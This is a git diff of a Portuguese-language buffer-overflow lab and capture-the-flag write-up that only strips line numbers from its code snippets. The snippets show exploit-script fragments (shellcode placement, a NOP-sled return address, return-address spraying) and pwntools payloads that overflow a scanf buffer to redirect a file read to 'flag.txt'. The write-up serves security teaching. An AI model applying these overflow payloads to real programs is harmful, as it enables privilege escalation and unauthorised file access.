@@ -46,11 +46,7 @@ O procedimento é semelhante ao do nível anterior, usando-se, na mesma, o _scri
 Usando, então, ```exploit.py```, que criará ```badfile```, começamos por colocar o _shellcode_ no fim da _payload_:
 
 ```python
-...
-
-16  start = 517 - len(shellcode)
-
-...
+  start = 517 - len(shellcode)
 ```
 
 Será importante fazer uso das intruções ```NOP```. Deste modo, o endereço de retorno malicioso que vamos introduzir na _payload_ levará a saltar para uma região de ```NOPs``` antecedentes ao _shellcode_, o que fará com que acabe por se saltar até ao _shellcode_, graças a essas instruções ```NOP```.
@@ -60,10 +56,7 @@ Usando o ```gdb``` da mesma forma que no nível anterior, descobrimos que o ende
 Assim, definimos ```ret```, com alguma margem:
 
 ```python
-...
-19  ret = 0xffffc980 + 400
-
-...
+  ret = 0xffffc980 + 400
 ```
 
 Como não sabemos o tamanho concreto do _buffer_, a variável ```offset``` no _script_ python não tem relevância.
@@ -73,12 +66,8 @@ Por último, tendo em conta que não sabemos o valor de ```ebp```, vamos fazer _
 Assim é feito o _spraying_ descrito:
 
 ```python
-...
-
-24  for i in range (50):
-25      content[i*L : i*4 + L] = (ret).to_bytes(L, byteorder='little')
-
-...
+  for i in range (50):
+      content[i*L : i*4 + L] = (ret).to_bytes(L, byteorder='little')
 ```
 
 De novo, após executar o _script_ para produzir ```badfile```, corremos ```stack-L2``` e, mais uma vez, temos uma _shell_ priveligiada:
@@ -112,14 +101,10 @@ Assim, o conteúdo de ```meme_file``` ditará o ficheiro aberto.
 Tendo atenção às primeiras linhas do código, facilmente descobrimos um potencial _buffer overflow_:
 
 ```c
-1   char meme_file[8] = "mem.txt\0";
-2   char buffer[32];
+  char meme_file[8] = "mem.txt\0";
+  char buffer[32];
 
-...
-
-11  scanf("%40s", &buffer);
-
-...
+  scanf("%40s", &buffer);
 ```
 
 A chamada a ```scanf``` permite ler do _input_ de utilizador até 40 caracteres. No entanto, estará a guardá-los em ```buffer```, que apenas "tem espaço" para 32. Aqui se encontra o potencial _buffer overflow_.
@@ -141,11 +126,7 @@ Testando localmente:
 E, finalmente, no servidor, após ajustar ```exploit-example.py``` à medida, revelando a _flag_:
 
 ```python
-...
-
-12   r.sendline(b"12345678901234567890123456789012flag.txt")
-
-...
+   r.sendline(b"12345678901234567890123456789012flag.txt")
 ```
 
 ![CTF 5](images/LB_5/CTF_5.png)
@@ -159,17 +140,13 @@ Começando por executar ```checksec program```, obtemos também:
 À semelhança do desafio anterior, o código de ```program``` contém uma vulnerabilidade de _buffer overflow_ ao povoar a variável ```buffer```:
 
 ```c
-...
 
-5   char val[4] = "\xef\xbe\xad\xde";
-6   char meme_file[9] = "mem.txt\0\0";
-7   char buffer[32];
+   char val[4] = "\xef\xbe\xad\xde";
+   char meme_file[9] = "mem.txt\0\0";
+   char buffer[32];
 
-...
+   scanf("%45s", &buffer);
 
-12  scanf("%45s", &buffer);
-
-...
 ```
 
 Apesar de ```buffer``` apenas ser de 32 bytes, a instrução da linha 12 permite ler _input_ de utilizador até 45 bytes. Assim, tal como no primeiro desafio, é possível, através desse _input_, povoar ```val``` e ```meme_file``` ao nosso jeito.
@@ -185,11 +162,7 @@ Assim sendo, o ataque dar-se-á inserindo 45 caracteres que povem ```buffer``` d
 Tendo em conta a ordem de declaração das variáveis em ```program``` e o explicado no âmbito do desafio anterior em relação à pilha, procedemos ao ataque no servidor, introduzindo, através do _script_ ```exploit-example.py```, ```xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxflag.txt\0\x24\x23\xfc\xfe```:
 
 ```python
-...
-
-12  r.sendline(b"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxflag.txt\0\x24\x23\xfc\xfe")
-
-...
+  r.sendline(b"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxflag.txt\0\x24\x23\xfc\xfe")
 ```
 
 No entanto, o _output_ que recebemos denota que o conteúdo que foi inserido em ```val``` não tem a ver com o pretendido, nem com ```deadbeef```:
